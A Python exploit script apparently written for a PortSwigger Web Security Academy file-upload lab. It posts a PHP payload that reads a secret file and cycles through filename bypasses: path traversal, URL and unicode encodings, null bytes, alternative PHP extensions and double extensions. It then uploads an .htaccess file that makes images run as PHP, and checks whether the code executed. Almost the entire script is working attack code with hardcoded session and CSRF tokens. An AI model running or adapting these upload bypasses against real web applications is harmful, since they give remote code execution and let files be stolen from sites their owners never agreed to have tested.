#!/usr/bin/env python3
import requests
import urllib.parse

# Target details
host = "0a200096044941a1841082800039003d.web-security-academy.net"
url = f"https://{host}/my-account/avatar"
session = "zaWArpVTEAPSF3P6dcrNojZWhrhGo6Uw"
csrf = "y1pdKmu7jq9F2k0Pi9mxG0rlhZ0VtODY"

# PHP payload
php_payload = '<?php echo file_get_contents("/home/carlos/secret"); ?>'

# Headers
headers = {
    "Cookie": f"session={session}",
    "Origin": f"https://{host}",
    "Referer": f"https://{host}/my-account?id=wiener",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
}

print("🎯 Testing Path Traversal File Upload Bypasses")
print("=" * 50)

# Test cases with different bypass techniques
test_cases = [
    # Basic path traversal
    ("../exploit.php", "image/jpeg", "Basic single traversal"),
    ("../../exploit.php", "image/jpeg", "Double traversal"),
    ("../../../exploit.php", "image/jpeg", "Triple traversal"),

    # URL encoded traversal
    ("..%2fexploit.php", "image/jpeg", "URL encoded slash"),
    ("..%2f..%2fexploit.php", "image/jpeg", "Double URL encoded"),
    ("..%252fexploit.php", "image/jpeg", "Double URL encoded (nested)"),

    # Alternative encodings
    ("..%c0%afexploit.php", "image/jpeg", "Unicode encoding"),
    ("..%c1%9cexploit.php", "image/jpeg", "Alternative unicode"),

    # Double dots
    ("....//exploit.php", "image/jpeg", "Double dots with slash"),
    ("....\\\\exploit.php", "image/jpeg", "Double dots with backslash"),

    # Backslash traversal (Windows style)
    ("..\\exploit.php", "image/jpeg", "Windows backslash"),
    ("..\\..\\exploit.php", "image/jpeg", "Windows double backslash"),

    # Absolute paths
    ("/exploit.php", "image/jpeg", "Absolute path"),
    ("/var/www/html/exploit.php", "image/jpeg", "Full absolute path"),

    # Null byte injection
    ("exploit.php%00.jpg", "image/jpeg", "Null byte injection"),
    ("exploit.php\x00.jpg", "image/jpeg", "Literal null byte"),

    # Alternative extensions
    ("exploit.phtml", "image/jpeg", "PHTML extension"),
    ("exploit.php5", "image/jpeg", "PHP5 extension"),
    ("exploit.phar", "image/jpeg", "PHAR extension"),

    # Polyglot attempts
    ("exploit.php.jpg", "image/jpeg", "Double extension"),
    ("exploit.jpg.php", "image/jpeg", "Reverse double extension"),

    # Special cases
    (".htaccess", "image/jpeg", "htaccess file"),
    ("php.ini", "image/jpeg", "php.ini file"),
]

successful_uploads = []

for filename, content_type, description in test_cases:
    print(f"\n📁 Testing: {description}")
    print(f"   Filename: {filename}")

    # Prepare the multipart data
    files = {
        'avatar': (filename, php_payload, content_type),
        'user': (None, 'wiener'),
        'csrf': (None, csrf)
    }

    try:
        # Send the upload request
        response = requests.post(url, headers=headers, files=files, verify=False, allow_redirects=False)

        if response.status_code in [200, 302]:
            print(f"   ✅ Upload succeeded (Status: {response.status_code})")

            # Try to find where it was uploaded
            clean_filename = filename.replace('../', '').replace('..\\', '').replace('..%2f', '')
            potential_paths = [
                f"/files/avatars/{filename}",
                f"/files/{filename}",
                f"/{filename}",
                f"/avatars/{filename}",
                # Also try without traversal sequences
                f"/files/avatars/{clean_filename}",
                f"/exploit.php",
                f"/files/exploit.php",
            ]

            for path in potential_paths:
                try:
                    test_url = f"https://{host}{path}"
                    test_response = requests.get(
                        test_url,
                        headers={"Cookie": f"session={session}"},
                        verify=False
                    )

                    if test_response.status_code == 200:
                        content = test_response.text.strip()

                        # Check if PHP was executed
                        if content and not content.startswith("<?php"):
                            print(f"   🎉 PHP EXECUTED at: {path}")
                            print(f"   📄 Content: {content}")
                            successful_uploads.append((filename, path, content))
                            break
                        elif content.startswith("<?php"):
                            print(f"   ⚠️ File found at {path} but PHP not executed")

                except Exception as e:
                    pass
        else:
            print(f"   ❌ Upload failed (Status: {response.status_code})")

    except Exception as e:
        print(f"   ❌ Error: {str(e)[:50]}")

# Test htaccess approach
print("\n" + "=" * 50)
print("📝 Testing .htaccess approach to enable PHP")

# First upload .htaccess
htaccess_content = """AddHandler application/x-httpd-php .jpg
AddType application/x-httpd-php .jpg"""

files = {
    'avatar': ('.htaccess', htaccess_content, 'image/jpeg'),
    'user': (None, 'wiener'),
    'csrf': (None, csrf)
}

try:
    response = requests.post(url, headers=headers, files=files, verify=False)
    if response.status_code in [200, 302]:
        print("✅ .htaccess uploaded")

        # Now upload PHP as .jpg
        files = {
            'avatar': ('exploit.jpg', php_payload, 'image/jpeg'),
            'user': (None, 'wiener'),
            'csrf': (None, csrf)
        }

        response = requests.post(url, headers=headers, files=files, verify=False)
        if response.status_code in [200, 302]:
            print("✅ PHP uploaded as .jpg")

            # Test if it executes
            test_url = f"https://{host}/files/avatars/exploit.jpg"
            test_response = requests.get(test_url, headers={"Cookie": f"session={session}"}, verify=False)

            if test_response.status_code == 200:
                content = test_response.text.strip()
                if content and not content.startswith("<?php"):
                    print(f"🎉 SUCCESS! PHP executed via .jpg")
                    print(f"📄 Secret: {content}")
                else:
                    print("❌ .jpg file found but PHP not executed")
    else:
        print(f"❌ .htaccess upload failed")

except Exception as e:
    print(f"❌ Error: {e}")

# Summary
if successful_uploads:
    print("\n" + "=" * 50)
    print("✅ SUCCESSFUL BYPASSES:")
    for filename, path, content in successful_uploads:
        print(f"   Filename: {filename}")
        print(f"   Path: {path}")
        print(f"   Secret: {content}")
else:
    print("\n❌ No successful bypasses found")
    print("The server may have strict validation. Try:")
    print("1. Different file upload endpoints")
    print("2. Archive upload with path traversal (zip/tar)")
    print("3. Race conditions during upload")
    print("4. Other server vulnerabilities")